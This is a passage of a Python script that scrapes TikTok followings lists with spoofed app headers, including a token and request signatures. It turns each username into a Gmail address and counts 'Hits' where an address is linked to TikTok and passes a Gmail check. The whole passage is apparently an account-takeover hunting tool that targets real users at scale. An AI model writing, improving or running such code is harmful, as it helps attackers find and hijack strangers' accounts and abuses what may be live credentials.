'0375cd6d4793949f0c1fbffbbf214bd8f30164a11d6f25e25bbf64cd4eeb57d19e038d0cba33388bc9e6366339c6766e38542b539e748b10032429083916186c8e084307f982d3168df208b7c810609e2e556ddd14c2cada22858b2255f9b065579de-CkA3YmIxYTA0NmYzYWI4NTFiOGI1ZThmYjMzYTk3ODMxOTVkMTU1NWVmMjY5NDQ5Yzk2OGEyZWQ2YzBlYWI0MWQx-2.0.0', 
                          'sdk-version': '1', 
                          'x-tt-trace-id': '00-cb0d0c7cf24f0f1ba8d51e896bf5ac43-cb0d0c7cf24f0f1b-01', 
                          'User-Agent': 'com.zhiliaoapp.musically/2019081160 (Linux; U; Android 10; ar_EG; Infinix X692; Build/QP1A.190711.020; Cronet/58.0.2991.0)', 
                          'X-Khronos': '1694591805',
                          'XGorgon':'83005ff000008e4a029840116a6f3d461d9c1aaef0c6f5e6c2ed'}
                      re = get(url,headers=he).json()['followings']
                      for user in re:
                            username=(user['unique_id'])
                            follower_count=int(user['follower_count'])
                            if '_' not in username:
                                    usernames.append(username)
                      return usernames
                except:return []

  def home(self):
    while True:
      try:
        sys.stdout.write(f'''\rHits : {self.good_gmail} Bad TikTok : {self.bad_tiktok} Bad gmail : {self.bad_gmail} Good TikTok : {self.good_tiktok}\r''')
        usernames=self.get_users()
        for username in usernames:
          email=username+'@gmail.com'
          if True == self.check_linked(email):
              self.good_tiktok+=1
              if True == self.check_gmail(username):
                  self.good_gmail+=1
                  self.info(username)
              else:self.bad_gmail+=1
          else:self.bad_tiktok+=1

          sys.stdout.write(f'''\rHits : {self.good_gmail} Bad TikTok : {self.bad_tiktok} Bad gmail : {self.bad_gmail} Good TikTok : {self.good_tiktok}\r''')
      except Exception as e:''
qredes()